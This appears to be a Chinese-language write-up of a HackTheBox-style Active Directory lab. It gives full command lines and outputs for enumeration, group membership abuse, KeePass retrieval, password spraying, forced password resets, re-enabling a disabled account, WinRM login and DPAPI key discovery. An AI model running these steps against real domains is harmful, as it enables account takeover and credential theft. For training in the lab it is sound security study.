```
account: 
levi.james / KingofAkron2025!
```

## nmap

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -sV -sC -Pn -T4 10.10.11.70
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 04:18 EDT
Nmap scan report for 10.10.11.70
Host is up (0.29s latency).
Not shown: 985 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-04 15:19:24Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-04T15:21:33
|_  start_date: N/A
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 491.51 seconds
```

---

| 端口        | 服务                  | 协议/用途   | 关键信息                                                |
| --------- | ------------------- | ------- | --------------------------------------------------- |
| 53        | DNS (domain)        | TCP/UDP | 域名解析服务，可能用于域内通信。                                    |
| 88        | Kerberos            | TCP     | **Active Directory 认证**（域控核心服务）。                    |
| 111       | RPCbind             | TCP/UDP | NFS 相关服务（`rpcbind`），但运行在 Windows 上可能异常。             |
| 135       | MSRPC               | TCP     | Windows 远程过程调用（常见于域控）。                              |
| 139/445   | SMB/NetBIOS         | TCP     | **文件共享服务**（SMB），可能暴露共享目录或漏洞（如 EternalBlue）。         |
| 389       | LDAP                | TCP     | **Active Directory 轻量目录访问协议**（存储用户/组信息）。            |
| 464       | kpasswd5            | TCP     | Kerberos 密码修改服务。                                    |
| 593       | RPC over HTTP       | TCP     | 远程过程调用（HTTP封装）。                                     |
| 636       | LDAPS               | TCP     | LDAP over SSL（加密通信）。                                |
| 2049      | NFS (nlockmgr)      | TCP/UDP | **异常**：NFS 通常用于 Linux，Windows 运行可能配置错误或模拟环境。        |
| 3268/3269 | LDAP Global Catalog | TCP     | 全局目录服务（扩展域信息）。                                      |
| 5985      | WinRM (HTTP)        | TCP     | **Windows 远程管理**（可能通过 HTTP 执行命令，如 PowerShell 远程连接）。 |

---

这就是一台域控
将域名添加进`/etc/hosts` 中

## PPC 111

根据端口扫描，我们有可能使用凭据登录的
111的RPC
445的SMB
这种靶场5985winrm一般是不能直接登上去的

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# rpcclient 10.10.11.70 -U levi.james
Password for [WORKGROUP\levi.james]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
rpcclient $> enumalsgroups domain
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[Access-Denied Assistance Users] rid:[0x458]
rpcclient $> srvinfo
        10.10.11.70    Wk Sv PDC Tim NT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b
rpcclient $> dsroledominfo
Machine Role = [5]
Directory Service is running.
Domain is in native mode.
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Mon, 04 Aug 2025 07:02:20 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Wed, 19 Feb 2025 14:33:28 EST
        Password can change Time :      Thu, 20 Feb 2025 14:33:28 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00004210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x000007a9
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> netshareenum
result was WERR_ACCESS_DENIED
rpcclient $> getdompwinfo
min_password_length: 7
password_properties: 0x00000001
        DOMAIN_PASSWORD_COMPLEX
```

我们用AI分析一下：
太棒了！你用 `rpcclient` 和 `levi.james` 这个用户连接上了目标域控制器，并且执行了一些非常关键的命令。从这些输出中，我们可以提取出大量有价值的信息，尤其是在渗透测试的初期阶段。

我们逐行分析每个命令的输出：

### 1. `rpcclient > enumdomusers`

这个命令用于枚举域中的所有用户。

* **`user:[Administrator] rid:[0x1f4]`**: 内置的管理员账户。RID 0x1f4 (500) 永远是管理员账户。
* **`user:[Guest] rid:[0x1f5]`**: 内置的访客账户。RID 0x1f5 (501) 永远是访客账户。
* **`user:[krbtgt] rid:[0x1f6]`**: Kerberos TGT (Ticket Granting Ticket) 服务账户。域控制器用来生成 Kerberos 票据的特殊账户，不能用于登录。
* **`user:[levi.james] rid:[0x44f]`**: 你当前正在使用的账户。
* **`user:[ant.edwards] rid:[0x450]`**:
* **`user:[adam.silver] rid:[0x451]`**:
* **`user:[jamie.williams] rid:[0x452]`**:
* **`user:[steph.cooper] rid:[0x453]`**:
* **`user:[steph.cooper_adm] rid:[0x457]`**: **这是一个重要的发现！** `steph.cooper_adm` 账户名带有 `_adm` 后缀，这通常暗示它是一个**管理员账户**或具有较高权限的账户。这个账户值得特别关注。

**信息点**: 你成功枚举了域中的用户列表。这些用户名是进行密码猜测、暴力破解、以及后续其他域攻击（如 AS-REPRoasting 或 Kerberoasting）的宝贵字典。特别是 `steph.cooper_adm` 账户，它是潜在的突破口。

### 2. `rpcclient > enumalsgroups domain`

这个命令用于枚举域组。
**注意**: `enumalsgroups` 实际上是枚举**本地**安全主体（用户和组）。但由于你连接的是域控制器，它会列出域中的**内置组**以及一些特定的功能组。而 `enumdomgroups` 才是枚举域中所有创建的组。

* **`group:[Cert Publishers] rid:[0x205]`**: 证书发布者组。
* **`group:[RAS and IAS Servers] rid:[0x229]`**: 远程访问服务和 Internet 认证服务服务器组。
* **`group:[Allowed RODC Password Replication Group] rid:[0x23b]`**: 允许只读域控制器复制密码的组。
* **`group:[Denied RODC Password Replication Group] rid:[0x23c]`**: 拒绝只读域控制器复制密码的组。
* **`group:[DnsAdmins] rid:[0x44d]`**: **重要发现！** DNS 管理员组。这个组的成员对 DNS 服务有完全控制权，这通常意味着可以**修改 DNS 记录**。在域控上，DNS 是非常关键的服务。DnsAdmins 组成员通常可以利用 DNS 服务器漏洞进行权限提升。
* **`group:[Access-Denied Assistance Users] rid:[0x458]`**: 访问被拒绝协助用户组。

**信息点**:

* 你确认了域中存在一些内置组和功能组。
* **`DnsAdmins` 组是一个高价值目标**，它的成员往往能间接实现域管理员权限。

### 3. `rpcclient > netshareenum`

* **`result was WERR_ACCESS_DENIED`**: 表示 `levi.james` 用户**没有权限**枚举远程主机的共享。这是非常常见的，因为普通域用户通常不具备列出所有共享的权限。

### 4. `rpcclient > srvinfo`

这个命令用于获取服务器的基本信息。

* **`10.10.11.70 Wk Sv PDC Tim NT`**:
  * `Wk`: Workstation (工作站) - 这个标志可能有点误导，或者表示它也可以作为工作站。
  * `Sv`: Server (服务器)
  * `PDC`: Primary Domain Controller (主域控制器) - **确认了这是一台域控制器！**
  * `Tim`: Time Server (时间服务器) - 域控制器通常也是时间服务器。
  * `NT`: 指的是 NT 家族的操作系统，通常是 Windows。
* **`platform_id : 500`**: 通常表示 Windows NT/2000/XP/Server 2003 及更新版本。
* **`os version : 10.0`**: **关键信息！** 表明操作系统是 **Windows 10 或 Windows Server 2016/2019/2022**。因为是 PDC，所以很可能是 Windows Server 2016 或更新版本。
* **`server type : 0x80102b`**: 这是一个位掩码，表示服务器的角色和功能。包含了 PDC、时间服务器等信息。

**信息点**:

* **确凿地证明目标主机 10.10.11.70 是一台运行 Windows Server 2016 或更新版本的域控制器 (PDC)**。这与 Nmap 的 `OS: Windows` 和 `kerberos-sec`、`ldap` 等服务的发现完美吻合。
* 知道了操作系统的精确版本，可以帮助你寻找特定的漏洞或利用方式。

### 5. `rpcclient > dsroledominfo`

这个命令用于查询目录服务角色和域信息。

* **`Machine Role = [5]`**: `5` 代表 `DS_ROLE_PRIMARY_DOMAIN_CONTROLLER`。**再次确认了这是一台主域控制器 (PDC)**。
* **`Directory Service is running.`**: 目录服务（即 Active Directory）正在运行。
* **`Domain is in native mode.`**: 域运行在原生模式。这意味着域功能级别已经被提升到 Windows 2000 或更高，并且所有域控制器都运行在支持原生模式的 Windows 版本上。这在现代 AD 环境中是常见的。

**信息点**: 对之前关于域控制器身份的判断进行了多次交叉验证，进一步确认目标是域中核心的域控制器。

### 6. `rpcclient > queryuser 0x1f4`

这个命令用于查询 RID 为 0x1f4 (即 Administrator) 的用户详细信息。

* **`User Name : Administrator`**: 确认是管理员账户。
* **`Description : Built-in account for administering the computer/domain`**: 内置账户描述。
* **`Logon Time : Mon, 04 Aug 2025 07:02:20 EDT`**: 显示了管理员账户最近一次登录的时间（尽管这个时间可能是扫描时服务器的当前时间，或者是一个有效的登录记录）。
* **`Password last set Time : Wed, 19 Feb 2025 14:33:28 EST`**: 管理员密码最后一次设置的时间。这是一个非常有用的信息，密码越久没改，被暴力破解或猜测的风险越高。
* **`Password must change Time: Wed, 13 Sep 30828 22:48:05 EDT`**: 显示密码强制更改的时间，看起来非常遥远，这通常意味着该账户的密码策略被设置为永不过期，或者在特定情况下（如管理员账户）不受强制密码更改策略的约束。
* **`user_rid : 0x1f4`**: 确认 RID。
* **`group_rid: 0x201`**: 0x201 (513) 是 `Domain Users` 组的 RID。这表明 Administrator 账户是 `Domain Users` 组的成员，这是默认行为。

**信息点**:

* 成功获取了域管理员账户的详细信息，包括其密码上次更改时间。
* `Password must change Time` 如此遥远，可能意味着管理员账户的密码永不过期，这在安全上是一个风险。

### 7. `rpcclient > getdompwinfo`

这个命令用于获取域的密码策略信息。

* **`min_password_length: 7`**: 域密码的最小长度是 7 个字符。
* **`password_properties: 0x00000001`**:
  * **`DOMAIN_PASSWORD_COMPLEX`**: **关键信息！** 表示域密码必须符合复杂性要求（包含大小写字母、数字、特殊字符中的至少三类）。

**信息点**: 你成功获取了域的密码策略。这对于进行密码猜测或暴力破解时构建字典非常有帮助。你知道密码至少 7 位，并且是复杂的。

### 综合分析

从 `rpcclient` 的这些输出中，你获得了对目标域控制器及其域环境的深刻理解：

1. **目标身份确认**: 10.10.11.70 是 **PUPPY.HTB0. 域的主域控制器 (PDC)**，运行 **Windows Server 2016 或更新版本**。
2. **域用户列表**: 拥有了域中所有用户的列表，特别是发现了一个潜在的管理员账户 `steph.cooper_adm`。
3. **高价值组**: 发现了 `DnsAdmins` 组，这是一个常见的权限提升路径。
4. **权限限制**: `levi.james` 用户没有权限枚举所有共享，表明其权限是普通域用户级别。
5. **密码策略**: 域密码最小长度为 7 位，且必须符合复杂性要求。

### 下一步行动建议

1. **DnsAdmins 组**: 尝试枚举 `DnsAdmins` 组的成员，看看 `levi.james` 或者其他用户（特别是 `steph.cooper_adm`）是否是这个组的成员。
   
   ```bash
   rpcclient > querygroupmember 0x44d # 0x44d 是 DnsAdmins 的 RID
   ```
2. **`steph.cooper_adm` 账户**:
   * 如果 `steph.cooper_adm` 账户是 `DnsAdmins` 成员，尝试获取 `steph.cooper_adm` 的凭证（暴力破解或 AS-REPRoasting，如果允许预认证）。
   * 如果能登录 `steph.cooper_adm`，可以利用 DnsAdmins 的权限进行提权。
3. **AS-REPRoasting**: 尝试对 `enumdomusers` 列表中的所有用户执行 AS-REPRoasting 攻击（使用 `GetNPUsers.py` 等工具），特别是那些不太可能强制预认证的账户。
4. **Kerberoasting**: 尝试对域中注册的服务主体名称 (SPN) 进行 Kerberoasting 攻击，以获取服务账户的 TGS-REP 票据，然后离线破解服务账户的密码。
5. **密码猜测/暴力破解**: 结合密码策略，对枚举到的用户（尤其是 `steph.cooper_adm` 和 `Administrator`）进行密码猜测或暴力破解。可以使用常见的密码列表和针对性的组合。
6. **Responder/NBNS/LLMNR Poisoning**: 如果你在内网中，可以尝试用 Responder 捕获域用户尝试访问共享时的哈希。

## SMB

使用submap：

```bash
[+] IP: 10.10.11.70:445 Name: PUPPY.HTB0.          Status: Authenticated
        Disk                                                       Permissions     Comment
        ----                                                       -----------     -------
        ADMIN$                                             NO ACCESS       Remote Admin
        C$                                                 NO ACCESS       Default share
        DEV                                                NO ACCESS       DEV-SHARE for PUPPY-DEVS
        IPC$                                               READ ONLY       Remote IPC
        NETLOGON                                           READ ONLY       Logon server share 
        SYSVOL                                             READ ONLY       Logon server share 
```

`DEV`文件有价值，但是此用户无法访问

## bloodhound分析攻击路线

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -d puppy.htb -ns 10.10.11.70 -c All --zip  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.puppy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 47S
INFO: Compressing output into 20250804141139_bloodhound.zip
```

先找我们所在：
`Sibling Objects in the Same OU`：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0eab9151f45343028f29b93d2481de49.png)
`Effective Inbound GPOs`：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2a2c794be5a54558be5362361e46fbde.png)
`First Degree Group Memberships`：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d75fa4197c3540d4af965105edad2d5f.png)
`Unrolled Group Membership`：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/fbda2b270d52497fa551740bfffebfd0.png)
入站控制：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/f0f364fbca3744b6bb599af9ccedceba.png)
出站控制：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/af629ff5f6ff4267a9a4e860c5fe9e15.png)
有凭据的用户所在组对developers组有写入权限，所以我们可以将自己写入那个组：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james
[+] levi.james added to DEVELOPERS
```

## KeePass

接着去smb访问dev目录：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# smbclient //10.10.11.70/DEV -U levi.james
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 03:07:57 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025

                5080575 blocks of size 4096. 1614433 blocks available
```

kdbx是KeePass软件的数据库文件格式，我们get下来
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/13da92a80ccb4a7fbfe79f7855776043.png)
发现需要密码，爆破试试，自带的约翰不行
下载工具：
[keepass4brute](https://github.com/r3nt0n/keepass4brute)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/f67c6999139c4af8b4c81169869b926b.png)
然后看样子要一周才能全部跑完，哈哈，那既然如此，我们不用傻傻等待，既然是靶机偷看一下答案：`liverpool`，成功进入：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a3de32119b0c413d9d79bbc0312827c8.png)

## 密码喷撒

里面五组密码做成密码字典：

```
HJKL2025!
Antman2025!
JamieLove2025!
ILY2025!
Steve2025!
```

最开始`rpc`中的用户做成用户字典：

```
Administrator
Guest
krbtgt
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# netexec smb 10.10.11.70 -u user.txt -p passwd5.txt
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)               
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\ant.edwards:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\jamie.williams:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\steph.cooper_adm:HJKL2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:Antman2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Guest:Antman2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\krbtgt:Antman2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\levi.james:Antman2025! STATUS_LOGON_FAILURE
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
```

成功了一个账户，而这个用户刚好是高价值用户，我们在攻击路径的高价值图中可以看到它：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/85e2e737b5e543bc9ce93e1138cab83f.png)
edwards所在的组完全控制silver，可修改一下密码`passwd123!`：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# bloodyAD -d puppy.htb -u ant.edwards -p Antman2025! --host 10.10.11.70 set password adam.silver passwd123!
[+] Password changed successfully!
```

然后发现登不上去，是因为账户disabled：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nxc smb 10.10.11.70 -u adam.silver -p passwd123!
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)               
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:passwd123! STATUS_ACCOUNT_DISABLED
```

## ldapsearch和bloodAD

这里使用`ldapsearch`的dn也可查看（`userAccountControl: 66050`），以及可以查看adam.silver的完整可分辨名称：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# ldapsearch -x -H ldap://10.10.11.70 -D 'ant.edwards@puppy.htb' -w 'Antman2025!' -b "dc=puppy,dc=htb" "(sAMAccountName=adam.silver)" dn
# extended LDIF
#
# LDAPv3
# base <dc=puppy,dc=htb> with scope subtree
# filter: (sAMAccountName=adam.silver)
# requesting: dn 
#

# Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

### 解析 `userAccountControl: 66050` 的含义

`userAccountControl` 是 Active Directory 中的一个属性，用于通过 **位掩码（bitmask）** 记录用户账户的状态和策略。数值 `66050` 是多个标志的组合值，可通过二进制分解来逐个解读。

---

#### **步骤 1：将 `66050` 转换为二进制**

```
66050 (十进制) = 00000001 00000000 10000010 (二进制)
                   └─第17位  └─第9位  └─第2位
```

#### **步骤 2：分解标志位**

将 `66050` 拆分为以下标志的组合：

1. **65536 (2^16)**: `DONT_EXPIRE_PASSWD`  
   表示 **密码永不过期**。
2. **512 (2^9)**: `NORMAL_ACCOUNT`  
   表示这是一个 **普通用户账户**（非系统账户）。
3. **2 (2^1)**: `ACCOUNTDISABLE`  
   表示 **账户已被禁用**。

---

#### **最终结论**

该用户账户 (`userAccountControl=66050`) 的配置含义为：
| 标志名称              | 值     | 解释                          |
|-----------------------|--------|------------------------------|
| `ACCOUNTDISABLE`       | 2      | 账户已被管理员禁用。          |
| `NORMAL_ACCOUNT`       | 512    | 这是一个普通用户账户。        |
| `DONT_EXPIRE_PASSWD`   | 65536  | 用户密码永不过期。            |

输出的 `userAccountControl` 值将是类似 `66050` 的组合，表明账户的 **禁用状态**、**密码永不过期** 且 **类型为普通用户**。

---

我们之后可以把值改为`66048`，这代表：

十进制 `66048` 对应的二进制为：

```
66048 (十进制) = 10000000 01000000 00000000 (二进制)
                   └─第17位   └─第9位
```

分解 `66048` 的标志位组合：
| **标志名称**          | **十进制值** | **二进制位** | **含义**                         |
|-----------------------|--------------|----------------|----------------------------------|
| `DONT_EXPIRE_PASSWD`  | 65536        | 2^16 (第17位)  | 用户密码永不过期。               |
| `NORMAL_ACCOUNT`      | 512          | 2^9 (第9位)    | 账户类型为普通用户（非系统账户）。 |

---

我们启用一下账户：
最简单的方法使用`bloodyAD`：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# bloodyAD -d puppy.htb -u ant.edwards -p Antman2025! --host 10.10.11.70 remove uac -f LOCKOUT -f ACCOUNTDISABLE adam.silver
[-] ['LOCKOUT', 'ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

| 参数                  | 含义                                      |
| ------------------- | --------------------------------------- |
| `remove uac`        | 修改目标用户的 **UserAccountControl (UAC)** 属性 |
| `-f LOCKOUT`        | 移除 `LOCKOUT` 标志（解除账户锁定）                 |
| `-f ACCOUNTDISABLE` | 移除 `ACCOUNTDISABLE` 标志（启用被禁用的账户）        |

---

| 标志               | 值            | 含义           |
| ---------------- | ------------ | ------------ |
| `LOCKOUT`        | `0x00000010` | 账户因多次失败登录被锁定 |
| `ACCOUNTDISABLE` | `0x00000002` | 账户被手动禁用      |

通过 `remove uac -f` 移除这些标志，可以恢复账户的正常状态。

---

第二种方法也可使用`ldap`，创建一个 `ldif` 文件内容如下，dn 是上一步查询的结果：

```bash
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048
```

`ldapmodify`执行文件，查看用户状态66048：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# ldapmodify -x -H ldap://10.10.11.70 -D 'ant.edwards@puppy.htb' -w 'Antman2025!' -f enable.ldif
modifying entry "CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB"


┌──(root㉿kali)-[/home/kali/Desktop]
└─# ldapsearch -x -H ldap://10.10.11.70 -D 'ant.edwards@puppy.htb' -w 'Antman2025!' -b "dc=puppy,dc=htb" "(&(objectClass=user)(sAMAccountName=adam.silver))" userAccountControl
# extended LDIF
#
# LDAPv3
# base <dc=puppy,dc=htb> with scope subtree
# filter: (&(objectClass=user)(sAMAccountName=adam.silver))
# requesting: userAccountControl 
#

# Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
userAccountControl: 66048

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

也可使用`bloodyAD`查看：

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# bloodyAD -d puppy.htb -u ant.edwards -p Antman2025! --host 10.10.11.70 get object adam.silver --attr userAccountControl

distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

区别：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/7fac87a9dff74c769a26ad4e24d754ac.png)

## winrm

```bash
evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'passwd123!'
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/abd45dfa0b0441a98e64a8324382b2d7.png)

## 权限提升

翻到根目录下有一个备份目录：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a54c168fac8147cf80b635d2930ec76d.png)
进去看看，下载下来：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/33dab19e4e3e4c13901025a1b509e8fd.png)
解压查看，发现用户密码`steph.cooper`/`ChefSteph2025!`：

```bash
┌──(root㉿kali)-[/home/kali/Desktop/puppy]
└─# cat nms-auth-config.xml.bak 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

这也是我们的高价值用户之一，属于远程管理组：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b123dc4f95404fab9eb563bdfa564b4a.png)
直接winrm登录成功，但是这个机子也不是域控，之前是有个名称和此用户一样的adm账户。
我们用winpeas扫一下
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/7e42a04dd7ee4021b761a3f8baa5103a.png)
先使用smb上传到steph.cooper里：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/1f88ccc834e140b68b159ce3ba73ac51.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ce85ec90ffb942f7a7754127275baa7e.png)
发现DPAPI的主密钥和加密凭证：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/cc69148ce21e45e7bd01535ec37d559b.png)

```bash
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys                                                                                           
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalat                                                  ion/index.html#dpapi                                                                        
    MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\45f27dcd-dfa8-4807-a86b-deb3b8ca73cb
    Accessed: 8/4/2025 4:06:44 PM
    Modified: 8/4/2025 4:06:44 PM
   =================================================================================                                                  ================                                                                            

    MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:40:36 AM
    Modified: 3/8/2025 7:40:36 AM
